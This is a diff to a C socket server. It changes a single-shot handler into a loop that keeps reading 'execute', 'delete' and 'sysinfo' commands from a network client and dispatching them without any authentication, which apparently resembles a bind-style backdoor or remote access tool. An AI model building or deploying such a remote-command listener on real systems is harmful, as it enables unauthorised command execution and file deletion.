@@ -91,28 +91,31 @@ int main(void)
     listen(server_fd, 3);
 
     new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen);
-    valread = read(new_socket, buffer, 1024);
 
-    strncpy(copy, buffer, 1024);
+    while(1){
+        valread = read(new_socket, buffer, 1024);
 
-    const char *feature = parse_feature(buffer);
-    const char *argument = parse_argument(copy);
+        strncpy(copy, buffer, 1024);
 
-    /* Call the appropriate function after the feature has been determined */
+        const char *feature = parse_feature(buffer);
+        const char *argument = parse_argument(copy);
 
-    if (strcmp(feature, "execute") == 0)
-    {
-       run_command(new_socket, argument);
-    }
+        /* Call the appropriate function after the feature has been determined */
 
-    if (strcmp(feature, "delete") == 0)
-    {
-       delete_file(new_socket, argument);
-    }
+        if (strcmp(feature, "execute") == 0)
+        {
+           run_command(new_socket, argument);
+        }
 
-    if (strcmp(feature, "sysinfo") == 0)
-    {
-       system_info(new_socket);
+        if (strcmp(feature, "delete") == 0)
+        {
+           delete_file(new_socket, argument);
+        }
+
+        if (strcmp(feature, "sysinfo") == 0)
+        {
+           system_info(new_socket);
+        }
     }
 
     return 0;
